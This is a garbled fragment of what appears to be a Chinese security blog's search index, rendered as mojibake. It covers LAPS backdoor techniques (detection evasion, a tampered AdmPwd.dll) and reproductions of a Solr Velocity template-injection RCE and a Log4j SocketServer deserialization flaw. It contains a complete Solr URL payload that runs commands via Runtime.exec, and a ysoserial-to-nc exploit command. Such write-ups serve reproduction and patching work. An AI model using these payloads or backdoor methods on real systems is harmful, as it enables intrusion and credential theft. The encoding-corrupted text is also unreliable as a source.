ä¸»æœºè´¦å·éœ€è®¾ç½®å§”æ´¾æ—¶ï¼Œåªèƒ½è®¾ç½®ä¸ºçº¦æŸæ€§å§”æ´¾ ","date":"2020-02-07","objectID":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/:2:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸåé—¨"],"title":"éšè”½åŸŸåé—¨","uri":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"LAPS åŸŸç½‘ç»œä¸­ï¼Œä¸»æœºçš„æœ¬åœ°ç®¡ç†å‘˜å¾ˆå°‘è¢«ä½¿ç”¨ï¼Œä½†æ˜¯ç»™ç½‘ç»œå®‰å…¨å´å¸¦æ¥äº†å¾ˆå¤§çš„é£é™©ã€‚æ”»å‡»è€…å¦‚æœè·å–äº†æœ¬åœ°ç®¡ ç†å‘˜çš„ NTLMï¼Œä¸å¿…ç ´è§£ï¼Œå³å¯é€šè¿‡ PTH æ”»å‡»åŸŸå†…å…¶ä»–ä¸»æœºã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¾®è½¯åœ¨2014 å¹´å‘å¸ƒäº† KB2871997 å’Œ KB2928120 ä¸¤ä¸ªè¡¥ä¸ï¼ŒPTH æ–¹å¼å¤±æ•ˆã€‚ å¦‚æœåŸŸå†…ä¸»æœºçš„æœ¬åœ°ç®¡ç†å‘˜çš„å£ä»¤æ¯”è¾ƒç®€å•ï¼Œåˆ™å¯èƒ½è¢«ç ´è§£ï¼Œå£ä»¤ä»ç„¶å¯è¢«ç”¨äºå£ä»¤çŒœè§£æˆ–çˆ†ç ´çš„å­—å…¸åº“ã€IPC æˆ–è¿œç¨‹æ¡Œé¢ç™»å½•ç­‰ã€‚ å¾®è½¯åœ¨ 2015 å¹´å‘å¸ƒäº†ä¸€ä¸ªæœ¬åœ°ç®¡ç†å‘˜å£ä»¤è§£å†³æ–¹æ¡ˆ LAPS(Local Administrator Password Solution)ï¼Œç”¨æ¥é›†ä¸­åŒ–ç®¡ç†åŸŸå†…ä¸»æœºæœ¬åœ°ç®¡ç†å‘˜çš„å£ä»¤ã€‚é€šè¿‡ LAPS åˆ¶ä½œç­–ç•¥ï¼Œå¼ºåˆ¶ç®¡ç†åŸŸå†…ä¸»æœºçš„æœ¬åœ°ç®¡ç†å‘˜å£ä»¤ï¼Œé˜²æ­¢æ¶æ„æ”»å‡»è€…åˆ©ç”¨æœ¬åœ°ç®¡ç†å‘˜å£ä»¤è¿›è¡ŒåŸŸå†…æ¨ªå‘æ”»å‡»ã€‚è¯¥æ–¹æ¡ˆåŒ…å«å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ï¼Œåˆ†åˆ«å®‰è£…äºåŸŸå†…ä¸»æœºå’ŒåŸŸæœåŠ¡å™¨ LAPS åŠŸèƒ½ æ ¹æ®ç­–ç•¥æœé›†æœ¬åœ°ç®¡ç†å‘˜è´¦å·(æœ€å¤šç®¡ç†ä¸€ä¸ªæœ¬åœ°ç®¡ç†å‘˜è´¦å·)ï¼Œè®¾ç½®ç¬¦åˆå¯†ç ç­–ç•¥çš„éšæœºå£ä»¤ å°†æ–°çš„å£ä»¤ä¸Šä¼ åˆ°åŸŸæœåŠ¡å™¨ï¼Œå¹¶å‚¨å­˜åœ¨åŸŸå†…å¯¹åº”çš„ä¸»æœºè´¦å·çš„å±æ€§ä¸­ å°†æ–°çš„è¿‡æœŸæ—¥æœŸæ›´æ–°åˆ°ä¸»æœºè´¦å·å±æ€§ æ£€æŸ¥æœ¬åœ°ç®¡ç†å‘˜è´¦å·çš„å£ä»¤æ˜¯å¦è¿‡æœŸï¼Œå¦‚æœå£ä»¤è¿‡æœŸï¼Œä¼šäº§ç”Ÿæ–°çš„éšæœºå£ä»¤ï¼Œå¹¶æ›´æ–° AD ä¸­ä¸»æœºè´¦å·çš„ç›¸å…³å±æ€§ã€‚ LAPSæä¾›äº† GUI å’Œ AdmPwd.PS è„šæœ¬æ¨¡å— 2 ç§ç®¡ç†å·¥å…·ã€‚å®‰è£…å®Œæˆ LAPS åï¼Œéœ€è¦ä½¿ç”¨ AdmPwd.PS æ¨¡å—çš„ Set-AdmPwdComputerSelfPermission å‘½ä»¤ï¼Œèµ‹äºˆæŸä¸ª OU æˆ–æ•´ä¸ªåŸŸå†…çš„ä¸»æœºå…·æœ‰è®¾ç½®è‡ªèº«å±æ€§çš„æƒé™ã€‚ æ¯ä¸ªä¸»æœºå¯¹è±¡èƒ½è‡ªåŠ¨å­˜å‚¨å£ä»¤æ˜å’Œå£ä»¤è¿‡æœŸæ—¶é—´ã€‚ åœ¨åŸŸæœåŠ¡å™¨ä¸­ï¼Œå¯é€šè¿‡ GUI ç›´æ¥æŸ¥çœ‹æŒ‡å®šä¸»æœºä¸­æœ¬åœ°ç®¡ç†å‘˜çš„å£ä»¤æ˜æ–‡ã€‚ LAPS åœ¨åŸŸå†…çš„ä¸»æœºè´¦å·å±æ€§ä¸­å¢åŠ äº† ms-Mcs-AdmPwd å’Œ ms-Mcs-AdmPwdExpirationTime ä¸¤ä¸ªå±æ€§ã€‚ç¬¬ 1 ä¸ªå±æ€§å­˜å‚¨æœ¬åœ°ç®¡ç†å‘˜çš„å£ä»¤æ˜æ–‡ï¼Œç¬¬ 2 ä¸ªå±æ€§å­˜å‚¨å£ä»¤çš„è¿‡æœŸæ—¶é—´ã€‚è¿™é‡Œä¹Ÿè®¸æœ‰è¯»è€…ä¼šç–‘é—®ï¼Œä¸ºä»€ä¹ˆä¼šå‚¨å­˜æ˜æ–‡å£ä»¤ï¼Œè€Œä¸æ˜¯æŸç§å¯†æ–‡å½¢å¼çš„å£ä»¤ã€‚ AdmPwd.PS æ¨¡å—çš„ Find-AdmPwdExtendedRights å‘½ä»¤ï¼Œå¯æ£€æµ‹åŸŸå†…å“ªäº›è´¦å·æˆ–ç»„å…·å¤‡è¯»å– ms-Mcs-AdmPwd å±æ€§çš„æƒé™ã€‚ åœ¨æ£€æµ‹æŸä¸ªç‰¹å®šçš„åŸŸå¯¹è±¡çš„ AD æƒé™æ—¶ï¼Œæœ‰ 2 ä¸ªäº‹æƒ…éœ€è¦è€ƒè™‘: æ˜¯å“ªäº›åŸŸå†…ä¸»ä½“å¯ä»¥èµ‹äºˆè‡ªèº«æˆ–å…¶ä»–åŸŸå†…ä¸»ä½“è¿™é¡¹ AD æƒé™; æ˜¯å“ªäº›å·²æœ‰çš„ ACE åŒ…å«äº†è¿™é¡¹ AD æƒé™ ï¼Œè¿™äº› ACE åº”ç”¨åœ¨å“ªäº›å¯¹è±¡ä¸Šã€‚ åœ¨åšç¬¬ 1 ä¸ªäº‹æƒ…çš„æ£€æŸ¥æ—¶ï¼ŒFind-AdmPwdExtendedRights æ²¡æœ‰æ£€æµ‹å®‰å…¨æè¿°ç¬¦çš„æ§åˆ¶æƒã€‚ åœ¨ç¬¬ 2 ä¸ªäº‹æƒ…çš„æ£€æŸ¥ä¸­ï¼Œè¯¥æ¥å£é€šè¿‡ 4 ä¸ªæ–¹é¢æ¥å†³å®šç»“æœ: AD å¯¹è±¡ç±»å‹ ACE è®¿é—®æ©ç  ACE å¯¹è±¡ç±»å‹ ACE ç»§æ‰¿çš„å¯¹è±¡ç±»å‹ åœ¨ AD å¯¹è±¡ç±»å‹æ£€æµ‹æ—¶ï¼ŒFind-AdmPwdExtendedRi ghts ä»…ä»…åˆ†æåº”ç”¨åˆ° OU æˆ–è®¡ç®—æœºçš„ ACEï¼Œæ‰€æœ‰å…¶ä»–çš„å®¹å™¨å¯¹è±¡éƒ½å¿½ç•¥ï¼Œä½¿ç”¨ Set-AdmPwdComputerSelfPermission è¿›è¡Œæƒé™è®¾ç½®æ—¶çš„å‚æ•°ä¹Ÿæ˜¯ OU ç±»å‹ã€‚æ”»å‡»è€…å¯ä»¥åœ¨é OU å®¹å™¨å¯¹è±¡ä¸Šèµ‹äºˆè‡ªèº«è¯»å– ms-Mcs-AdmPwd å±æ€§çš„æƒé™ msImaging-PSPs ç±»å‹å®¹å™¨ä¸åœ¨æ£€æµ‹åˆ†æèŒƒå›´ï¼Œå¦‚æœå°†è®¡ç®—æœºå¯¹è±¡æ”¾è‡³è¯¥ç±»å‹çš„å®¹å™¨ä¸­ï¼Œåˆ™å¯ä»¥è§„é¿è¢«æ£€æµ‹ å¦‚æœèµ‹äºˆæŸä¸ªä½æƒé™ç”¨æˆ·å…³äºè¯¥ç±»å‹å®¹å™¨çš„å®Œå…¨æƒé™ï¼Œåˆ™å¯ä»¥æ§åˆ¶å®¹å™¨ä¸­è®¡ç®—æœºçš„å±æ€§ï¼ŒåŒ…æ‹¬ ms-Mcs-AdmPwd å±æ€§ã€‚ win7x86user æ˜¯åŸŸå†…æ™®é€šç”¨æˆ·ï¼ŒNotOu ä¸ºä¸€ä¸ª msImaging-PSPsç±»å‹å®¹å™¨ï¼Œå…¶ä¸­æœ‰ä¸€å°æœºå™¨win7x86cnï¼Œåœ¨ NotOuä¸Šèµ‹äºˆäº† win7x86user å¯¹è¯¥å®¹å™¨çš„å…¨éƒ¨æƒé™ï¼Œå®¹å™¨ä¸­çš„å¯¹è±¡ win7x86cnç»§æ‰¿äº†æ‰€æœ‰æƒé™ ä¸Šé¢çš„æµ‹è¯•å’Œå®éªŒè¡¨æ˜ï¼Œåœ¨å®‰è£…æœ‰ LAPS ç¯å¢ƒçš„åŸŸç½‘ç»œä¸­ï¼Œå¯ä»¥æœ‰æ•ˆåˆ©ç”¨ LAPS ä½œä¸ºä¸€ä¸ªéšè”½çš„åé—¨ï¼Œèµ‹äºˆä½æƒé™ç”¨æˆ·éšæ—¶è¯»å–é«˜æƒé™ä¸»æœºæœ¬åœ°ç®¡ç†å‘˜å£ä»¤æ˜æ–‡çš„æƒé™ï¼Œä»è€Œå¿«é€Ÿè·å–é«˜æƒé™ä¸»æœºçš„æ§åˆ¶æƒï¼Œè¿›ä¸€æ­¥é€šè¿‡æ•£åˆ—å€¼è·å–ç­‰æ–¹å¼è·å–åŸŸæ§åˆ¶æƒé™ã€‚å½“ç„¶è¿™ä¸€åˆ‡çš„å‰ææ˜¯å·²ç»è·å–äº†åŸŸæ§åˆ¶æƒé™ã€‚ LAPSåœ¨å®¢æˆ·ç«¯ä»…ä»…éƒ¨ç½²äº†ä¸€ä¸ª AdmPwd.dll æ–‡ä»¶ï¼Œç”¨äºå“åº”æ¥è‡ªåŸŸæœåŠ¡å™¨çš„å¯†ç æ›´æ”¹ç­–ç•¥ï¼Œç„¶åå°†å£ä»¤æ˜æ–‡ä»¥ Kerberos åŠ å¯†æ–¹å¼å­˜å‚¨è‡³æœåŠ¡å™¨ä¸­å¯¹åº”çš„ä¸»æœºè´¦å·çš„ ms-Mcs-AdmPwd å±æ€§ LAPSèµ·æºäºä¸€ä¸ªå…¬å¼€é¡¹ç›®ï¼Œé€šè¿‡å¯¹å…¬å¼€é¡¹ç›®æºç çš„åˆ†æï¼Œå¯ä»¥ä½¿ç”¨æ‰‹åŠ¨çš„æ–¹å¼æ¨¡æ‹Ÿå£ä»¤ä¿®æ”¹è¿‡ç¨‹ å®¢æˆ·ç«¯åœ¨ä½¿ç”¨ AdmPwd.dll æ–‡ä»¶æ—¶ï¼ŒWindows å¹¶æ²¡æœ‰å¯¹è¯¥æ–‡ä»¶è¿›è¡Œå®Œæ•´æ€§æ ¡éªŒæˆ–è€…ç­¾åéªŒè¯ã€‚å› æ­¤ä¸€ä¸ªè¢«ç¯¡æ”¹è¿‡çš„ DLL ä¸€æ ·å¯ä»¥æ­£å¸¸ä½¿ç”¨ã€‚æ‰€ä»¥å¦‚æœæ”»å‡»è€…æ ¹æ®å…¬å¼€æºç ç¼–è¯‘ä¸€ä¸ªåŠŸèƒ½ç±»ä¼¼çš„ DLLï¼ŒåŒæ—¶åœ¨ DLL ä¸­æ·»åŠ éƒ¨åˆ†åŠŸèƒ½ï¼Œå°†ä¿®æ”¹åçš„å£ä»¤æ˜æ–‡å†™åˆ°æŒ‡å®šä½ç½®ã€‚è¿™å¯ä½¿æ”»å‡»è€…éšæ—¶éƒ½èƒ½è·å–å£ä»¤æ˜æ–‡ï¼Œä»è€Œå…·å¤‡å¯¹å®¢æˆ·ç«¯çš„å®Œå…¨æ§åˆ¶æƒé™ æ ¹æ®LAPSçš„å®‰è£…ä»‹ç»è¯´æ˜ï¼Œåœ¨å®¢æˆ·ç«¯ä¸Šå®‰è£…æœ‰3ç§æ–¹å¼ï¼Œ å®¢æˆ·ç«¯å®‰è£… LAPS.x64.msi æˆ– LAPS.x86.msi åœ¨å®¢æˆ·ç«¯ä½¿ç”¨ regsvr32.exe AdmPwd.dll å®‰è£… å¦‚æœä»¥ç¬¬äºŒç§æ–¹å¼åœ¨å®¢æˆ·ç«¯å®‰è£… LAPS ï¼Œä¸” AdmPwd.dll çš„ç›®å½•ä¸ºæ™®é€šç”¨æˆ·çš„å¯å†™ç›®å½•ï¼Œåˆ™æ™®é€šç”¨æˆ·å¯ç›´æ¥ç”¨ä¼ªé€ çš„ DLL æ–‡ä»¶æ›¿æ¢åŸæ¥çœŸå®çš„ DLL æ–‡ä»¶ã€‚å¯è·å–æœ¬åœ°ç®¡ç†å‘˜çš„å£ä»¤æ˜æ–‡ï¼Œè·å–æœ¬æœºçš„å®Œå…¨æ§åˆ¶æƒï¼Œå®ç°æƒé™æå‡ LAPS æ˜¯å¾®è½¯ä¸ºäº†åŠ å¼ºæœ¬åœ°ç®¡ç†å‘˜çš„å£ä»¤ç®¡ç†ï¼Œæé«˜ç½‘ç»œå®‰å…¨æ€§è€Œéƒ¨ç½²çš„è§£å†³æ–¹æ¡ˆï¼Œä½†æ˜¯æ–¹æ¡ˆä¸­çš„ä¸€äº›ç‘•ç–µå¯¼è‡´ LAPS å¯ä»¥å˜æˆæ”»å‡»è€…åˆ¶ä½œéšè”½åé—¨çš„å·¥å…·ã€‚ä¸ä»… LAPS å¦‚æ­¤ï¼Œè®¸å¤šå…¶ä»–è½¯ä»¶äº¦æ˜¯å¦‚æ­¤ã€‚éšç€äº§å“çš„å¢å¤šï¼Œå®‰å…¨æ€§å¾—åˆ°æå‡çš„åŒæ—¶ï¼Œæš´éœ²ç»™æ”»å‡»è€…çš„æ”»å‡»é¢åŒæ—¶ä¹Ÿå¾—åˆ°äº†æ‰©å¤§ã€‚å®‰å…¨ä¹‹è·¯ä»»é‡é“è¿œã€‚ ","date":"2020-02-07","objectID":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/:2:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸåé—¨"],"title":"éšè”½åŸŸåé—¨","uri":"/2020/02/%E9%9A%90%E8%94%BD%E5%9F%9F%E5%90%8E%E9%97%A8/"},{"categories":["æ¼æ´å¤ç°"],"content":"Apache Solræ¨¡æ¿æ³¨å…¥è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´","date":"2020-01-02","objectID":"/2020/01/apache-solr%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","tags":["æ¼æ´å¤ç°","Solr"],"title":"Apache Solræ¨¡æ¿æ³¨å…¥è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´","uri":"/2020/01/apache-solr%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"Apache Solr æ¨¡æ¿æ³¨å…¥è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ Apache Solr æ˜¯ç¾å›½é˜¿å¸•å¥‡ï¼ˆApacheï¼‰è½¯ä»¶åŸºé‡‘ä¼šçš„ä¸€æ¬¾åŸºäº Luceneï¼ˆä¸€æ¬¾å…¨æ–‡æœç´¢å¼•æ“ï¼‰çš„æœç´¢æœåŠ¡å™¨ã€‚Apache Velocity æ˜¯ä¸€ä¸ªæä¾› HTML é¡µé¢æ¨¡æ¿ã€email æ¨¡æ¿å’Œé€šç”¨å¼€æºä»£ç ç”Ÿæˆå™¨æ¨¡æ¿çš„æ¨¡æ¿å¼•æ“ã€‚åœ¨ Apache Solr çš„å¤šä¸ªç‰ˆæœ¬ä¸­ï¼ŒApache Solr çš„ VelocityResponseWriter åŠŸèƒ½çš„é…ç½®å‚æ•°å¯é€šè¿‡ HTTP è¯·æ±‚æŒ‡å®šï¼Œå¯¼è‡´ç”¨æˆ·å¯é€šè¿‡è®¾ç½®ç‰¹å®šå‚æ•°åï¼Œé€šè¿‡æ³¨å…¥ä»»æ„ Velocity æ¨¡æ¿é€ æˆä»»æ„å‘½ä»¤æ‰§è¡Œã€‚ ","date":"2020-01-02","objectID":"/2020/01/apache-solr%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["æ¼æ´å¤ç°","Solr"],"title":"Apache Solræ¨¡æ¿æ³¨å…¥è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´","uri":"/2020/01/apache-solr%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"å½±å“èŒƒå›´ 5.0.0 \u003c= Apache Solr \u003c= 8.3.1 ","date":"2020-01-02","objectID":"/2020/01/apache-solr%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["æ¼æ´å¤ç°","Solr"],"title":"Apache Solræ¨¡æ¿æ³¨å…¥è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´","uri":"/2020/01/apache-solr%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"ç¯å¢ƒæ­å»º å¯ç”¨ vulhub çš„ solr ç¯å¢ƒè¿›è¡Œå¤ç° docker-compose up -d docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db å°† contrib/velocity/lib ä¸­ä»¥ velocity å¼€å¤´çš„ jaråŒ…å¤åˆ¶åˆ° server/solr-webapp/webapp/WEB-INF/lib/ ä¸‹: é‡å¯ solr æœåŠ¡ã€‚ ","date":"2020-01-02","objectID":"/2020/01/apache-solr%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["æ¼æ´å¤ç°","Solr"],"title":"Apache Solræ¨¡æ¿æ³¨å…¥è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´","uri":"/2020/01/apache-solr%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"æ¼æ´å¤ç° åœ¨æ»¡è¶³ä»¥ä¸Šç¯å¢ƒæ¡ä»¶çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨æ­¤æ¼æ´åˆ†ä¸¤æ­¥éª¤ã€‚å…ˆé€šè¿‡ä¸€ä¸ª HTTP è¯·æ±‚å°† params.resource.loader.enabled è¿™ä¸ªå…³é”®çš„å‚æ•°è®¾ç½® trueï¼Œè¿™æ ·å°±èƒ½å…è®¸ä»»æ„çš„æ¨¡æ¿ä»£ç ä»ç”¨æˆ·çš„ HTTP è¯·æ±‚ä¸­æŒ‡å®šã€‚ç„¶åå†é€šè¿‡æŒ‡å®šä»»æ„ Velocity æ¨¡æ¿ä»£ç æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ç”±äº Solr é»˜è®¤æœªå¼€å¯è®¤è¯ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ­¤æ¼æ´åˆ©ç”¨ä¸éœ€è¦ç™»å½•å‡­æ®ã€‚ { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } å‘é€ payloadï¼š è®¿é—®ï¼šhttp://IP:8983/solr/test/select?q=1\u0026wt=velocity\u0026v.template=custom\u0026v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end æ‰§è¡Œ id å‘½ä»¤çš„è¿”å›ç»“æœï¼š ","date":"2020-01-02","objectID":"/2020/01/apache-solr%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":["æ¼æ´å¤ç°","Solr"],"title":"Apache Solræ¨¡æ¿æ³¨å…¥è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´","uri":"/2020/01/apache-solr%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"ä¿®å¤å»ºè®® å‡çº§åˆ° Apache Solr 8.4 ","date":"2020-01-02","objectID":"/2020/01/apache-solr%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":["æ¼æ´å¤ç°","Solr"],"title":"Apache Solræ¨¡æ¿æ³¨å…¥è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´","uri":"/2020/01/apache-solr%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"Apache Log4j SocketServerååºåˆ—åŒ–æ¼æ´å¤ç°","date":"2019-12-30","objectID":"/2019/12/apache-log4j-socketserver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2019-17571/","tags":["æ¼æ´å¤ç°","Log4j SocketServer"],"title":"Apache Log4j SocketServerååºåˆ—åŒ–æ¼æ´å¤ç°","uri":"/2019/12/apache-log4j-socketserver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2019-17571/"},{"categories":["æ¼æ´å¤ç°"],"content":"Apache Log4j SocketServer ååºåˆ—åŒ–æ¼æ´å¤ç° Apache Log4j æ˜¯ä¸€ä¸ªåŸºäº Java çš„æ—¥å¿—è®°å½•å·¥å…·ï¼Œæ˜¯ Apache è½¯ä»¶åŸºé‡‘ä¼šçš„ä¸€ä¸ªé¡¹ç›®ï¼Œæ˜¯å‡ ç§ Java æ—¥å¿—æ¡†æ¶ä¹‹ä¸€ã€‚ è¿‘æ—¥ï¼ŒApache Log4j å®˜æ–¹æŠ«éœ²åœ¨ 1.2.x ç‰ˆæœ¬ä¸­çš„SocketServerç±»å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2019-17571ï¼‰ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨æ¼æ´å¯å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ Log4j 1.2.x ç‰ˆæœ¬ä¸­çš„ org.apache.log4j.net.SocketServer ç±»ï¼Œå­˜åœ¨ååºåˆ—åŒ–æ¼æ´ã€‚ä½¿ç”¨ Log4j SocketServer ç±»åˆ›å»ºçš„ Socket ç›‘å¬æœåŠ¡å¤„ç†æ¥å—æ•°æ®æ—¶ï¼Œå®¹æ˜“å¯¹ä¸å¯ä¿¡æ•°æ®è¿›è¡Œååºåˆ—åŒ–ï¼Œç»“åˆååºåˆ—åŒ–å°å·¥å…·ï¼Œæ”»å‡»è€…å¯ä»¥å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ ","date":"2019-12-30","objectID":"/2019/12/apache-log4j-socketserver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2019-17571/:0:0","tags":["æ¼æ´å¤ç°","Log4j SocketServer"],"title":"Apache Log4j SocketServerååºåˆ—åŒ–æ¼æ´å¤ç°","uri":"/2019/12/apache-log4j-socketserver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2019-17571/"},{"categories":["æ¼æ´å¤ç°"],"content":"ç¯å¢ƒæ­å»º ç”¨åˆ°çš„ jar åŒ…: java -cp log4j-1.2.17.jar:commons-collections-3.1.jar org.apache.log4j.net.SocketServer 8888 ./log4jserver.properties ./ ","date":"2019-12-30","objectID":"/2019/12/apache-log4j-socketserver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2019-17571/:1:0","tags":["æ¼æ´å¤ç°","Log4j SocketServer"],"title":"Apache Log4j SocketServerååºåˆ—åŒ–æ¼æ´å¤ç°","uri":"/2019/12/apache-log4j-socketserver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2019-17571/"},{"categories":["æ¼æ´å¤ç°"],"content":"æ¼æ´å¤ç° java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 \"open -a Calculator\" | nc 127.0.0.1 8888 å‘é€ payload åï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ï¼š ","date":"2019-12-30","objectID":"/2019/12/apache-log4j-socketserver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2019-17571/:2:0","tags":["æ¼æ´å¤ç°","Log4j SocketServer"],"title":"Apache Log4j SocketServerååºåˆ—åŒ–æ¼æ´å¤ç°","uri":"/2019/12/apache-log4j-socketserver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2019-17571/"},{"categories":["æ¼æ´å¤ç°"],"content":"ä¿®å¤å»ºè®® Apache Log4j çš„ 1.2 ç³»åˆ—ç‰ˆæœ¬å®˜æ–¹åœ¨2015å¹´8æœˆå·²åœæ­¢ç»´æŠ¤ï¼Œåœ¨ 2.8.2 ç‰ˆæœ¬ä¸­å·²ä¿®å¤äº†è¯¥æ¼æ´ï¼Œå»ºè®®å°½å¿«å‡çº§åˆ° 2.8.2 æˆ–æ›´é«˜çš„ç‰ˆæœ¬ï¼› ä¸‹è½½åœ°å€ï¼šhttps://logging.apache.org/log4j/2.x/download.html åœæ­¢ä½¿ç”¨ Log4j çš„ SocketServer ç±»åˆ›å»º Socket æœåŠ¡ï¼Œæœªä½¿ç”¨ Log4j çš„ SocketServer ç±»çš„åŠŸèƒ½ä¸å—æ¼æ´å½±å“ï¼› ","date":"2019-12-30","objectID":"/2019/12/apache-log4j-socketserver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2019-17571/:3:0","tags":["æ¼æ´å¤ç°","Log4j SocketServer"],"title":"Apache Log4j SocketServerååºåˆ—åŒ–æ¼æ´å¤ç°","uri":"/2019/12/apache-log4j-socketserver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecve-2019-17571/"},{"categories":["æ¼æ´å¤ç°"],"content":"Apache Solr CVE-2019-12409 RCE æ¼æ´å¤ç°","date":"2019-11-20","objectID":"/2019/11/apache-solr-cve-2019-12409-rce-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","tags":["æ¼æ´å¤ç°","Solr"],"title":"CVE-2019-12409 æ¼æ´å¤ç°","uri":"/2019/11/apache-solr-cve-2019-12409-rce-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["æ¼æ´å¤ç°"],"content":"Apache Solr CVE-2019-12409 RCE æ¼æ´å¤ç° è¯¥æ¼æ´æºäºé»˜è®¤é…ç½®æ–‡ä»¶ solr.in.sh ä¸­çš„ ENABLE_REMOTE_JMX_OPTS é…ç½®é€‰é¡¹å­˜åœ¨å®‰å…¨é£é™©ã€‚ å¦‚æœä½¿ç”¨å—å½±å“ç‰ˆæœ¬ä¸­çš„é»˜è®¤ solr.in.sh 